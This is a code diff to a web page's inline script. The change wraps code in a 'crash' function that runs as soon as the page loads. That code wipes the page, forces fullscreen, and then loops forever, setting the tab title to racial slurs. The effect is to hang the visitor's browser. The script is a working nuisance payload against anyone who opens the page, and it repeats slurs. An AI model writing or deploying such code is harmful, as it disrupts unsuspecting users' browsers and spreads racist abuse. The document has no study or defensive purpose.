@@ -5,19 +5,22 @@
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
-document.body.innerHTML = ""
-if (document.documentElement.requestFullscreen) {
-  document.documentElement.requestFullscreen();
-} else if (document.documentElement.webkitRequestFullscreen) {
-  document.documentElement.webkitRequestFullscreen();
-} else if (document.documentElement.msRequestFullscreen) {
-  document.documentElement.msRequestFullscreen();
+async function crash() {
+  document.body.innerHTML = ""
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen();
+  } else if (document.documentElement.webkitRequestFullscreen) {
+    document.documentElement.webkitRequestFullscreen();
+  } else if (document.documentElement.msRequestFullscreen) {
+    document.documentElement.msRequestFullscreen();
+  }
+  await sleep(500)
+  while (true) {
+    document.title = "nigga"
+    document.title = "nigger"
+  }
 }
-await sleep(500)
-while (true) {
-  document.title = "nigger"
-  document.title = "nigga"
-}
+crash();
     </script>
   </body>
 </html>
